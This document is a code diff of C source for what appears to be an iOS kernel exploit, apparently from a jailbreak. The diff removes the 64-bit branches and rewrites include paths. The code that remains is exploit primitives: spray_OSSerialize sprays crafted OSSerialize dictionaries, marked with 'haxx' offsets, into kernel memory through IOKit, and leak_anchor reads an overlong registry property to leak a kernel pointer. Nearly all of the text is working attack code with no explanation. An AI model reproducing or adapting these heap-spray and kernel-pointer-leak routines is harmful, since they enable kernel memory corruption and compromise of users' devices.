@@ -1,23 +1,12 @@
-#include <IOKit/IOKitLib.h>
+#include "../IOKit/IOKitLib.h"
 #include <mach/mach.h>
 #include <stdlib.h>
 
-#include <plog.h>
-#include <common.h>
-#include <io.h>
+#include "plog.h"
+#include "common.h"
+#include "io.h"
 
-#ifdef __LP64__
-#include "mig/iokitUser.c"
-#else
-extern kern_return_t io_service_open_extended(mach_port_t               service,
-                                              task_t                    owningTask,
-                                              uint32_t                  connect_type,
-                                              NDR_record_t              ndr,
-                                              io_buf_ptr_t              properties,
-                                              mach_msg_type_number_t    propertiesCnt,
-                                              kern_return_t             *result,
-                                              mach_port_t               *connection);
-#endif
+#include "../IOKit/iokitUser.c"
 
 static mach_port_t get_io_master_port(void)
 {
@@ -68,12 +57,8 @@ io_connect_t _io_spawn_client(void *dict, size_t dictlen)
 
 mach_port_t spray_OSSerialize(void* data, size_t size)
 {
-#ifdef __LP64__
-    uint32_t offset = 2;
-#else
     uint32_t offset = 1;
-#endif
-    
+
     int cnt = 0;
     int dict_sz = size + (6 * sizeof(uint32_t)) + (offset * 4)/* haxx */;
     uint32_t* dictz = calloc(1, dict_sz);
@@ -83,9 +68,6 @@ mach_port_t spray_OSSerialize(void* data, size_t size)
     dictz[cnt++] = 0x00424242;
     dictz[cnt++] = kOSSerializeData | size | kOSSerializeEndCollection;
     dictz[cnt++] = 0x0; /* haxx */
-#ifdef __LP64__
-    dictz[cnt++] = 0x0; /* haxx */
-#endif
     memcpy(dictz + 5 + offset/* haxx */, data, size);
     
     return _io_spawn_client(dictz, dict_sz);
@@ -111,11 +93,7 @@ int leak_anchor(addr_t* anchor)
         ret = IORegistryEntryGetProperty(o, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", (char*)buf, &size);
         if(ret == KERN_SUCCESS)
         {
-#ifdef __LP64__
-            *anchor = buf[1];
-#else
             *anchor = buf[9];
-#endif
             return 0;
         }
         IOObjectRelease(o);
